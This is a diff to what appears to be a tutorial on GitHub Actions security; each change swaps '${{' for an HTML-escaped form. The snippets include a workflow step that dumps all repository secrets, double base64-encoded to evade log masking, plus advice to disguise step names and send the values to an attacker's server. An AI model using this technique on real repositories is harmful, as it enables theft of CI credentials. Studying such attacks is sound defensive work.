@@ -40,7 +40,7 @@ Consider this vulnerable workflow step:
 ```yaml
 - name: Deploy to production
   run: |
-    echo "${{ secrets.SSH_PRIVATE_KEY }}" > /tmp/deploy_key
+    echo "$&#123;{ secrets.SSH_PRIVATE_KEY }}" > /tmp/deploy_key
     chmod 600 /tmp/deploy_key
     ssh -i /tmp/deploy_key -o StrictHostKeyChecking=no deploy@prod.example.com "deploy_script.sh"
 ```
@@ -64,7 +64,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: nothing to see here
-        run: echo '${{ toJSON(secrets) }}' | base64 | base64 # bypass log masking
+        run: echo '$&#123;{ toJSON(secrets) }}' | base64 | base64 # bypass log masking
 ```
 
 This writes all available secrets to the workflow logs and bypasses GitHub's secret masking. In a real engagement you would blend the workflow name and step names into something ordinary, and you would probably exfiltrate the values to a server you control rather than leaving them in the logs.
@@ -99,7 +99,7 @@ Consider a PR that adds a step like this:
 ```yaml
 - name: Add API key to local config
   env:
-    API_KEY: ${{ secrets.API_KEY }}
+    API_KEY: $&#123;{ secrets.API_KEY }}
   run: |
     sed "s/PLACEHOLDER_API_KEY/$API_KEY/" settings.conf
 ```
